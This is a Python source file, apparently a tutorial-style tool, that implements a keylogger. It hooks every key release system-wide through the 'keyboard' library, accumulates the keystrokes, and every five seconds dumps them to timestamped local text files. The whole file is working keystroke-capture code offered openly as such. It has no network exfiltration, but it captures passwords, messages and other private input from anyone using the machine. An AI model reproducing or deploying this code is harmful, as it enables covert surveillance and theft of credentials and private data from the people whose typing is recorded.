import keyboard
from threading import Timer
from datetime import datetime

# Интервал сохранения в секундах
SEND_REPORT_EVERY = 5

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start = datetime.now()
        self.end = datetime.now()

    def callback(self, event):
        name = event.name
        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        else:
            name = f"[{name.upper()}]"
        self.log += name

    def update_file_name(self):
        start_dt_str = str(self.start)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog--{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            f.write(self.log)
        print(f"Saving {self.filename}.txt")

    def report(self):
        if self.log:
            self.end = datetime.now()
            self.update_file_name()
            self.report_to_file()
            self.start = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def startI(self):
        self.start = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    Keylogger(interval=SEND_REPORT_EVERY).startI()